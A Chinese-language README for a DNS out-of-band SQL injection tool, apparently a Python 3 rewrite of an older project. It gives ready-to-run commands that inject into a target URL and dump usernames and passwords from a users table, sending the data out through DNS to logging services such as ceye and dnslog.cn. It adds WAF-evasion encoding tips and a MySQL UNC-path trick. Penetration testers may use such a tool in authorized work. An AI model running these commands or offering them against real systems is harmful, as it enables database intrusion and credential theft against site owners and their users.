# DnslogSqlinj 3

现代 DNS 带外 SQL 注入工具。Python 3.8+，单文件，零依赖。

原版 [DnslogSqlinj](https://github.com/ADOOO/DnslogSqlinj)（2019，py2，ceye 硬编码，仅 MySQL）的非官方重写：一次解析搬 30 字节，四种数据库、四种平台、三种技术。

## 安装

```bash
git clone https://github.com/YOUR_GITHUB/dnslogsqlinj3 && cd dnslogsqlinj3
python3 dnslogsqlinj3.py --help        # 直接跑
pip install . && dnslogsqlinj3 --help  # 或装成命令
```

## 用法

```bash
# 1) 离线自检
python3 dnslogsqlinj3.py --self-test

# 2) 回调通道体检（领域名 → 探针解析 → 平台确认）
python3 dnslogsqlinj3.py --provider ceye --token TOKEN --ident IDENT --check

# 3) 探路：确认注入点闭合正确
python3 dnslogsqlinj3.py --provider ceye --token TOKEN --ident IDENT --dbms mysql \
  --url "http://TARGET/Less-9/?id=1'%PAYLOAD%--+-" --expr "select 0x414243"

# 4) 脱库
python3 dnslogsqlinj3.py --provider ceye --token TOKEN --ident IDENT --dbms mysql \
  --url "http://TARGET/Less-9/?id=1'%PAYLOAD%--+-" \
  --expr "select group_concat(username,0x3a,password) from users"
```

## 三种技术

| 技术 | 命令 | 每字符请求 | 依赖 |
|---|---|---|---|
| DNS HEX 带外（默认） | 直接跑 | 1 次搬 30 字节 | FILE 权限 + 出 DNS |
| DNS 布尔 | `--blind` | 7 | FILE 权限 + 出 DNS |
| SLEEP 时间盲注 | `--technique time` | 7 × samples | 只要 SQL 能跑 |

## 支持

- **数据库**：`mysql` `mssql` `oracle` `postgres`
- **平台**：`dnslog.cn` / `ceye`（`--token --ident`）/ `dnsloggo`（`--base --token`）/ `cmd`（自定义命令）
- **参数**：`--prefix`（默认 `AND `）、`--encode auto|strict`、`--chunk`、`--http-timeout`、`--sleep-delay`、`--samples`

## 三个坑（已内置）

1. 全量 URL 编码把 `/ " ( )` 变成 `%2F %22 %28`，会被部分 WAF 断连 → 默认只编码空格与 `& # % +`。
2. MySQL 在某些 Windows 上只对 `//host/share/x.txt` 发起解析，反斜杠 UNC 直接返回 NULL。
3. `%PAYLOAD%` 只替换表达式，缺 `AND` 会拼出语法错 → `--prefix` 默认 `AND `。

## 测试

```bash
python3 -m unittest discover -s tests -t . -v   # 24 个用例，全离线
```

## 声明

仅用于你有明确授权的测试环境。MIT License，与原作者无关。
